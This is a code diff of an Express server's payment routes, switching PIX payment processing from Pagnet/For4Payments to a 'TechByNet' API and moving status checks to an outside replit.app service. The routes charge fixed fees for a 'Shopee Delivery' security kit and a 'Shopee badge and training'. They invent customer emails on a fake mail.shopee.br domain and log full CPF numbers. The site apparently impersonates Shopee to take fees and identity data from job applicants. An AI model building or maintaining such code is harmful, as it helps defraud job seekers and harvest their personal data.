@@ -742,18 +742,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
   
-  // Rota proxy para Pagnet API para evitar CORS
+  // Rota proxy para TechByNet API para evitar CORS
   app.post('/api/proxy/for4payments/pix', async (req, res) => {
     try {
-      // Verificar se a API Pagnet está configurada
-      if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
-        console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas');
+      // Verificar se a API TechByNet está configurada
+      if (!process.env.TECHBYNET_API_KEY) {
+        console.error('ERRO: TECHBYNET_API_KEY não configurada');
         return res.status(500).json({
-          error: 'Serviço de pagamento não configurado. Configure as chaves de API Pagnet.',
+          error: 'Serviço de pagamento não configurado. Configure a chave de API TechByNet.',
         });
       }
       
-      console.log('Iniciando proxy para Pagnet...');
+      console.log('Iniciando proxy para TechByNet...');
       
       // Processar os dados recebidos
       const { name, cpf, email, phone, amount = 47.40, description = "Kit de Segurança Shopee Delivery" } = req.body;
@@ -765,17 +765,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Gerar email se não tiver sido fornecido
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
       
-      console.log('Enviando requisição para Pagnet API via proxy...', {
+      console.log('Enviando requisição para TechByNet API via proxy...', {
         name: name,
         cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`
       });
       
-      // Importar e usar a API Pagnet
-      const { createPagnetAPI } = await import('./pagnet-api');
-      const pagnetAPI = createPagnetAPI();
+      // Importar e usar a API TechByNet
+      const { techbynetAPI } = await import('./lib/techbynet-api');
       
-      // Criar transação PIX usando Pagnet
-      const result = await pagnetAPI.createPixTransaction(
+      // Criar transação PIX usando TechByNet
+      const result = await techbynetAPI.createPixTransaction(
         {
           nome: name,
           cpf: cpf,
@@ -786,7 +785,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         phone
       );
       
-      console.log('Resposta da Pagnet recebida pelo proxy');
+      console.log('Resposta da TechByNet recebida pelo proxy');
       
       // Se a resposta foi bem-sucedida e temos os dados do PIX, enviar email
       if (result.success && result.pix_code) {
@@ -848,15 +847,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
         
         return res.status(200).json(compatibleResponse);
       } else {
-        // Retornar erro da Pagnet
+        // Retornar erro da TechByNet
         return res.status(400).json({
           error: result.error || 'Erro desconhecido na criação do pagamento'
         });
       }
     } catch (error: any) {
-      console.error('Erro no proxy Pagnet:', error);
+      console.error('Erro no proxy TechByNet:', error);
       return res.status(500).json({ 
-        error: error.message || 'Falha ao processar pagamento pelo proxy Pagnet'
+        error: error.message || 'Falha ao processar pagamento pelo proxy TechByNet'
       });
     }
   });
@@ -1135,11 +1134,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Rota principal para processar pagamentos
   app.post('/api/payments', async (req, res) => {
     try {
-      // Verificar se a API For4Payments está configurada
-      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
-        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
+      // Verificar se a API TechByNet está configurada
+      if (!process.env.TECHBYNET_API_KEY) {
+        console.error('ERRO: TECHBYNET_API_KEY não configurada');
         return res.status(500).json({
-          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
+          error: 'Serviço de pagamento não configurado. Configure a chave de API TechByNet.',
         });
       }
 
@@ -1165,17 +1164,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       console.log(`Processando pagamento de R$ ${paymentAmount/100} para ${name}, CPF ${cpf}`);
       
-      // Processar pagamento via For4Payments
-      const paymentResult = await paymentService.createPixPayment({
-        name,
-        email: userEmail,
-        cpf,
-        phone: phone || '',
-        amount: paymentAmount/100,
-        items
-      });
+      // Processar pagamento via TechByNet
+      const { techbynetAPI } = await import('./lib/techbynet-api');
+      const result = await techbynetAPI.createPixTransaction(
+        {
+          nome: name,
+          cpf: cpf,
+          email: userEmail,
+          phone: phone
+        },
+        paymentAmount/100,
+        phone
+      );
       
-      console.log('Resultado do pagamento For4Payments:', paymentResult);
+      console.log('Resultado do pagamento TechByNet:', result);
+      
+      if (!result.success) {
+        return res.status(400).json({
+          error: result.error || 'Erro ao criar pagamento'
+        });
+      }
+      
+      // Adaptar resposta para formato esperado
+      const paymentResult = {
+        id: result.transaction_id,
+        pixCode: result.pix_code,
+        pixQrCode: `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(result.pix_code)}`,
+        status: 'pending'
+      };
       
       // Se o pagamento foi processado com sucesso, enviar email
       if (paymentResult.pixCode && paymentResult.pixQrCode) {
@@ -1228,14 +1244,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
   
-  // Rota para processar pagamento PIX (usando TS API For4Payments)
+  // Rota para processar pagamento PIX (usando TechByNet API)
   app.post('/api/payments/pix', async (req, res) => {
     try {
-      // Verificar se a API For4Payments está configurada
-      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
-        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
+      // Verificar se a API TechByNet está configurada
+      if (!process.env.TECHBYNET_API_KEY) {
+        console.error('ERRO: TECHBYNET_API_KEY não configurada');
         return res.status(500).json({
-          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
+          error: 'Serviço de pagamento não configurado. Configure a chave de API TechByNet.',
         });
       }
 
@@ -1261,16 +1277,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       console.log(`Processando pagamento de R$ ${paymentAmount} para ${name}, CPF ${cpf}`);
       
-      // Processar pagamento via For4Payments
-      const paymentResult = await paymentService.createPixPayment({
-        name,
-        email: userEmail,
-        cpf,
-        phone: phone || '',
-        amount: paymentAmount
-      });
+      // Processar pagamento via TechByNet
+      const { techbynetAPI } = await import('./lib/techbynet-api');
+      const result = await techbynetAPI.createPixTransaction(
+        {
+          nome: name,
+          cpf: cpf,
+          email: userEmail,
+          phone: phone
+        },
+        paymentAmount,
+        phone
+      );
       
-      console.log('Resultado do pagamento For4Payments:', paymentResult);
+      console.log('Resultado do pagamento TechByNet:', result);
+      
+      if (!result.success) {
+        return res.status(400).json({
+          error: result.error || 'Erro ao criar pagamento'
+        });
+      }
+      
+      // Adaptar resposta para formato esperado
+      const paymentResult = {
+        id: result.transaction_id,
+        pixCode: result.pix_code,
+        pixQrCode: `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(result.pix_code)}`,
+        status: 'pending'
+      };
       
       // Se o pagamento foi processado com sucesso, enviar email
       if (paymentResult.pixCode && paymentResult.pixQrCode) {
@@ -1413,16 +1447,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
   
-  // Rota específica para pagamentos de treinamento (R$ 49,90)
+  // Rota específica para pagamentos de treinamento (R$ 97,00)
   app.post('/api/payments/treinamento', async (req, res) => {
     try {
       console.log('[DEBUG] Recebida requisição para pagamento de treinamento');
       
-      // Verificar se a API For4Payments está configurada
-      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
-        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
+      // Verificar se a API TechByNet está configurada
+      if (!process.env.TECHBYNET_API_KEY) {
+        console.error('ERRO: TECHBYNET_API_KEY não configurada');
         return res.status(500).json({
-          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
+          error: 'Serviço de pagamento não configurado. Configure a chave de API TechByNet.',
         });
       }
 
@@ -1440,36 +1474,44 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: 'CPF é obrigatório.' });
       }
       
-      // Valor fixo para o treinamento: R$ 49,90
-      const paymentAmount = 9700 / 100; // Converter o valor de centavos para reais
+      // Valor fixo para o treinamento: R$ 97,00
+      const paymentAmount = 97.00;
       
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
       
       console.log(`Processando pagamento de treinamento de R$ ${paymentAmount} para ${name}, CPF ${cpf}`);
       
-      // Processar pagamento via For4Payments
-      console.log(`[DEBUG] Enviando para For4Payments: nome=${name}, email=${userEmail}, cpf=${cpf}, valor=${paymentAmount}`);
+      // Processar pagamento via TechByNet
+      console.log(`[DEBUG] Enviando para TechByNet: nome=${name}, email=${userEmail}, cpf=${cpf}, valor=${paymentAmount}`);
       
-      const paymentParams = {
-        name,
-        email: userEmail,
-        cpf,
-        phone: phone || '',
-        amount: paymentAmount,
-        items: items || [{
-          title: "Crachá Shopee + Treinamento Exclusivo",
-          quantity: 1,
-          unitPrice: 9700,
-          tangible: false
-        }]
+      const { techbynetAPI } = await import('./lib/techbynet-api');
+      const result = await techbynetAPI.createPixTransaction(
+        {
+          nome: name,
+          cpf: cpf,
+          email: userEmail,
+          phone: phone
+        },
+        paymentAmount,
+        phone
+      );
+      
+      console.log('Resultado do pagamento de treinamento TechByNet:', result);
+      
+      if (!result.success) {
+        return res.status(400).json({
+          error: result.error || 'Erro ao criar pagamento de treinamento'
+        });
+      }
+      
+      // Adaptar resposta para formato esperado
+      const paymentResult = {
+        id: result.transaction_id,
+        pixCode: result.pix_code,
+        pixQrCode: `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(result.pix_code)}`,
+        status: 'pending'
       };
-      
-      console.log('[DEBUG] Parâmetros completos:', JSON.stringify(paymentParams));
-      
-      const paymentResult = await paymentService.createPixPayment(paymentParams);
-      
-      console.log('Resultado do pagamento de treinamento For4Payments:', paymentResult);
       
       // Se o pagamento foi processado com sucesso, enviar email
       if (paymentResult.pixCode && paymentResult.pixQrCode) {
@@ -1524,7 +1566,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
   
-  // Rota para verificar o status de um pagamento na For4Payments e enviar para o Facebook Pixel
+  // Rota para verificar o status de um pagamento via recoveryfy (mantém sistema atual)
   app.post('/api/payments/:id/check-status', async (req, res) => {
     try {
       const { id } = req.params;
@@ -1533,32 +1575,35 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: 'ID de pagamento não fornecido' });
       }
       
-      // Verificar se temos a chave API configurada
-      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
-        return res.status(500).json({ error: 'Chave de API For4Payments não configurada' });
-      }
+      // Usar sistema recoveryfy atual para verificação
+      console.log(`[STATUS] Verificando pagamento ${id} via recoveryfy...`);
       
-      // Importar o módulo de monitoramento
-      const { processTransaction } = await import('./transaction-monitor');
+      // Fazer requisição para recoveryfy
+      const axios = require('axios');
+      const response = await axios.get(`https://recoveryfy.replit.app/api/status/${id}`, {
+        timeout: 10000
+      });
       
-      // Processar a transação (verificar status e reportar se aprovada)
-      const result = await processTransaction(id);
+      const statusData = response.data;
+      console.log(`[STATUS] Resposta recoveryfy para ${id}:`, statusData);
       
       // Atualizar o cache se a transação for processada com sucesso
-      if (result) {
-        const paymentCache = global._paymentCache || {};
-        if (paymentCache[id]) {
+      const paymentCache = global._paymentCache || {};
+      if (paymentCache[id]) {
+        paymentCache[id].status = statusData.status?.toUpperCase() || 'PENDING';
+        if (statusData.status === 'approved') {
           paymentCache[id].facebookReported = true;
-          paymentCache[id].status = 'APPROVED';
         }
       }
       
+      // Retornar o status no formato esperado
       return res.json({ 
-        success: true, 
-        processed: result,
-        message: result 
-          ? 'Transação aprovada e reportada ao Facebook Pixel' 
-          : 'Transação verificada, mas não foi necessário reportar'
+        success: true,
+        orderId: id,
+        status: statusData.status || 'pending',
+        message: statusData.status === 'approved' 
+          ? 'Transação aprovada' 
+          : 'Transação ainda pendente'
       });
     } catch (error: any) {
       console.error('Erro ao verificar status do pagamento:', error);
@@ -1582,14 +1627,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       
       // Verificar se a chave secreta está configurada
-      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
-        console.error('FOR4PAYMENTS_SECRET_KEY não configurada');
+      if (!process.env.TECHBYNET_API_KEY) {
+        console.error('TECHBYNET_API_KEY não configurada');
         return res.status(500).json({ 
-          error: 'FOR4PAYMENTS_SECRET_KEY não configurada. Configure a chave de API For4Payments.'
+          error: 'TECHBYNET_API_KEY não configurada. Configure a chave de API TechByNet.'
         });
       }
       
-      console.log('Processando pagamento via API For4Payments...');
+      console.log('Processando pagamento via API TechByNet...');
       
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${nome.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
@@ -1597,14 +1642,32 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Valor fixo para o kit de segurança: R$ 47,40
       const paymentAmount = 47.40;
       
-      // Processar pagamento via API For4Payments
-      const paymentResult = await paymentService.createPixPayment({
-        name: nome,
-        email: userEmail,
-        cpf: cpf,
-        phone: telefone || '',
-        amount: paymentAmount
-      });
+      // Processar pagamento via TechByNet
+      const { techbynetAPI } = await import('./lib/techbynet-api');
+      const result = await techbynetAPI.createPixTransaction(
+        {
+          nome: nome,
+          cpf: cpf,
+          email: userEmail,
+          phone: telefone
+        },
+        paymentAmount,
+        telefone
+      );
+      
+      if (!result.success) {
+        return res.status(400).json({
+          error: result.error || 'Erro ao criar pagamento'
+        });
+      }
+      
+      // Adaptar resposta para formato esperado
+      const paymentResult = {
+        id: result.transaction_id,
+        pixCode: result.pix_code,
+        pixQrCode: `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(result.pix_code)}`,
+        status: 'pending'
+      };
       
       // Armazenar dados do pagamento em cache global
       // Isso é uma solução temporária até termos um banco de dados adequado
